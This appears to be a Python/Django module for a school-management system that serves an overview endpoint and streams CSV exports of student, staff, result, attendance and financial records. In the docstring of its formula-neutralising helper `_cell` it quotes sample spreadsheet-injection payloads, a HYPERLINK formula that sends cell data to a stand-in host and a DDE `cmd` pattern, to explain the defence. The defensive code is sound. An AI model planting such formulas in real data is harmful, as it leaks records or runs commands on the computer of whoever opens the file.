"""Cross-module reporting: one overview number set, and CSV out.

It lives in `apps.api` rather than in an app of its own because it owns no
data — it reads people, academics, attendance, assessment and finance and
writes nothing. A `reporting` app would be a migrations directory with nothing
in it and one more place to look.

CSV, not XLSX: every school office opens CSV, it streams row by row so a
twelve-thousand-row export never builds a spreadsheet in memory, and it needs
no dependency. A school that wants formatting opens it in Excel and saves.
"""

import csv
from decimal import Decimal

from django.db.models import Count
from django.http import StreamingHttpResponse
from django.utils import timezone
from django.utils.dateparse import parse_date
from drf_spectacular.utils import extend_schema
from rest_framework import serializers, viewsets
from rest_framework.decorators import action
from rest_framework.exceptions import ValidationError
from rest_framework.response import Response

from apps.accounts.permissions import RequirePermission
from apps.api.mixins import lookup_param

ViewAllStudents = RequirePermission("people.view_all_students")
ViewStaff = RequirePermission("people.view_staff")
ViewAllAttendance = RequirePermission("attendance.view_all")
GenerateReport = RequirePermission("assessment.generate_report")
ViewInvoice = RequirePermission("finance.view_invoice")


class _Echo:
    """A file-like object whose `write` returns the line, for streaming."""

    def write(self, value):
        return value


#: Characters Excel and LibreOffice read as "this cell is a formula".
_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")


def _cell(value):
    """Neutralise a value Excel would execute rather than display.

    The docstring above invites exactly this: "a school that wants formatting
    opens it in Excel and saves". Names, notes and admission numbers here come
    from an admissions form and a CSV import, so a pupil registered as
    `=HYPERLINK("http://x/?"&A1,"Click")` — or the classic `=cmd|'…'!A1` — is a
    live formula in the bursar's spreadsheet, aimed at whoever opens the export.
    Quoting is not enough: a CSV-quoted cell is still a formula once parsed.

    A leading apostrophe is the standard defusing and the one every spreadsheet
    understands. Applied only to the strings that could start one, so ordinary
    cells — and the numbers and dates the office sorts on — are untouched.
    """
    if isinstance(value, str) and value.startswith(_FORMULA_LEADERS):
        return f"'{value}"
    return value


def csv_response(filename: str, header: list[str], rows) -> StreamingHttpResponse:
    writer = csv.writer(_Echo())
    stream = (writer.writerow([_cell(cell) for cell in row]) for row in [header, *rows])
    response = StreamingHttpResponse(stream, content_type="text/csv")
    response["Content-Disposition"] = f'attachment; filename="{filename}"'
    return response


class ReportScopeSerializer(serializers.Serializer):
    session = serializers.UUIDField(required=False)
    term = serializers.UUIDField(required=False)


def _current(model, **filters):
    return model.objects.filter(**filters).first()


class AnalyticsView(viewsets.ViewSet):
    """`/reports/overview/` — the numbers a proprietor asks for on a Monday.

    Deliberately one request. Six tiles on a dashboard fetched separately is
    six round trips on a connection that drops.
    """

    permission_classes = [ViewAllStudents]
    serializer_class = ReportScopeSerializer

    @extend_schema(responses={200: None})
    def list(self, request):
        from apps.academics.models import AcademicSession, Enrolment, EnrolmentStatus, Term
        from apps.attendance.models import AttendanceStatus, StudentAttendance
        from apps.finance.selectors import collection_summary
        from apps.people.models import Staff, StaffStatus, Student, StudentStatus

        session = lookup_param(request, "session", AcademicSession) or _current(
            AcademicSession, is_current=True
        )
        term = lookup_param(request, "term", Term) or _current(Term, is_current=True)

        enrolments = Enrolment.objects.filter(session=session, status=EnrolmentStatus.ACTIVE)
        # The daily register only, the same slice `_attendance_totals` puts on a
        # report card. A school running per-period marking too has one row per
        # subject per day, so counting both weights those days by the size of
        # the timetable and the rate stops being "how full was the school".
        attendance = StudentAttendance.objects.filter(subject__isnull=True)
        if term is not None:
            attendance = attendance.filter(date__range=(term.start_date, term.end_date))
        marked = attendance.count()
        present = attendance.filter(
            status__in=[AttendanceStatus.PRESENT, AttendanceStatus.LATE]
        ).count()

        return Response(
            {
                "as_at": timezone.now(),
                "session": session.name if session else None,
                "term": term.name if term else None,
                "students": {
                    "total": Student.objects.alive().count(),
                    "active": Student.objects.alive().filter(status=StudentStatus.ACTIVE).count(),
                    "enrolled_this_session": enrolments.count(),
                    "by_level": list(enrolments.values("level__code").annotate(count=Count("id"))),
                },
                "staff": {
                    "total": Staff.objects.alive().count(),
                    "active": Staff.objects.alive().filter(status=StaffStatus.ACTIVE).count(),
                },
                "attendance": {
                    "records": marked,
                    "present": present,
                    "rate": _rate(present, marked),
                },
                "finance": collection_summary(session=session, term=term),
            }
        )


def _rate(part: int, whole: int) -> Decimal:
    if not whole:
        return Decimal("0.00")
    return (Decimal(part) / Decimal(whole) * 100).quantize(Decimal("0.01"))


class ExportView(viewsets.ViewSet):
    """`/reports/export/<dataset>/` — the office's data, as CSV.

    Each dataset carries the permission its own module would require, so an
    export is never a way round object-level scoping.
    """

    permission_classes = [ViewAllStudents]
    serializer_class = ReportScopeSerializer

    @extend_schema(responses={200: None})
    @action(detail=False, methods=["get"], permission_classes=[ViewAllStudents])
    def students(self, request):
        from apps.people.models import Student

        queryset = Student.objects.alive().select_related("current_level", "current_arm")
        return csv_response(
            "students.csv",
            ["Number", "Surname", "First name", "Other names", "Class", "Status", "Phone"],
            (
                [
                    student.display_number,
                    student.last_name,
                    student.first_name,
                    student.other_name,
                    str(student.current_arm or student.current_level or ""),
                    student.status,
                    student.phone or "",
                ]
                for student in queryset.iterator()
            ),
        )

    @extend_schema(responses={200: None})
    @action(detail=False, methods=["get"], permission_classes=[ViewStaff])
    def staff(self, request):
        from apps.people.models import Staff

        queryset = Staff.objects.alive().select_related("department")
        return csv_response(
            "staff.csv",
            ["Number", "Surname", "First name", "Type", "Department", "Status", "Phone"],
            (
                [
                    person.staff_number,
                    person.last_name,
                    person.first_name,
                    person.staff_type,
                    str(person.department or ""),
                    person.status,
                    person.phone or "",
                ]
                for person in queryset.iterator()
            ),
        )

    @extend_schema(responses={200: None})
    @action(detail=False, methods=["get"], permission_classes=[GenerateReport])
    def results(self, request):
        from apps.academics.models import Term
        from apps.assessment.models import TermResult

        queryset = TermResult.objects.select_related(
            "enrolment__student", "enrolment__level", "term"
        )
        # Resolved rather than passed straight to `filter`: the row is streamed,
        # so a malformed id raised deep inside an already-started response.
        term = lookup_param(request, "term", Term)
        if term is not None:
            queryset = queryset.filter(term=term)
        return csv_response(
            "results.csv",
            ["Number", "Name", "Class", "Term", "Subjects", "Average", "GPA", "CGPA", "Position"],
            (
                [
                    result.enrolment.student.display_number,
                    result.enrolment.student.full_name,
                    str(result.enrolment.class_arm or result.enrolment.level),
                    str(result.term),
                    result.subjects_count,
                    result.average,
                    result.gpa or "",
                    result.cgpa or "",
                    result.position or "",
                ]
                for result in queryset.iterator()
            ),
        )

    @extend_schema(responses={200: None})
    @action(detail=False, methods=["get"], permission_classes=[ViewAllAttendance])
    def attendance(self, request):
        from apps.attendance.models import StudentAttendance

        queryset = StudentAttendance.objects.select_related("student", "class_arm")
        for field, lookup in (("date_from", "date__gte"), ("date_to", "date__lte")):
            value = request.query_params.get(field)
            if not value:
                continue
            # Parsed here rather than handed to `filter`: an unparseable date
            # raised inside the stream, which is a 500 halfway through a
            # download rather than a rejected request.
            parsed = parse_date(value)
            if parsed is None:
                raise ValidationError({field: ["Use a date as YYYY-MM-DD."]})
            queryset = queryset.filter(**{lookup: parsed})
        return csv_response(
            "attendance.csv",
            ["Date", "Number", "Name", "Class", "Status", "Method"],
            (
                [
                    row.date,
                    row.student.display_number,
                    row.student.full_name,
                    str(row.class_arm or ""),
                    row.status,
                    row.method,
                ]
                for row in queryset.iterator()
            ),
        )

    @extend_schema(responses={200: None})
    @action(detail=False, methods=["get"], permission_classes=[ViewInvoice])
    def invoices(self, request):
        from apps.academics.models import Term
        from apps.finance.models import Invoice

        queryset = Invoice.objects.alive().select_related("student", "term")
        term = lookup_param(request, "term", Term)
        if term is not None:
            queryset = queryset.filter(term=term)
        return csv_response(
            "invoices.csv",
            ["Invoice", "Number", "Name", "Term", "Total", "Paid", "Balance", "Status", "Due"],
            (
                [
                    invoice.number,
                    invoice.student.display_number,
                    invoice.student.full_name,
                    str(invoice.term or ""),
                    invoice.total,
                    invoice.amount_paid,
                    invoice.balance,
                    invoice.status,
                    invoice.due_date or "",
                ]
                for invoice in queryset.iterator()
            ),
        )

    @extend_schema(responses={200: None})
    @action(detail=False, methods=["get"], permission_classes=[ViewInvoice])
    def payments(self, request):
        from apps.finance.models import Payment

        queryset = Payment.objects.select_related("invoice__student")
        return csv_response(
            "payments.csv",
            ["Receipt", "Date", "Invoice", "Name", "Amount", "Method", "Status", "Gateway"],
            (
                [
                    payment.reference,
                    payment.paid_at or "",
                    payment.invoice.number,
                    payment.invoice.student.full_name,
                    payment.amount,
                    payment.method,
                    payment.status,
                    payment.gateway,
                ]
                for payment in queryset.iterator()
            ),
        )
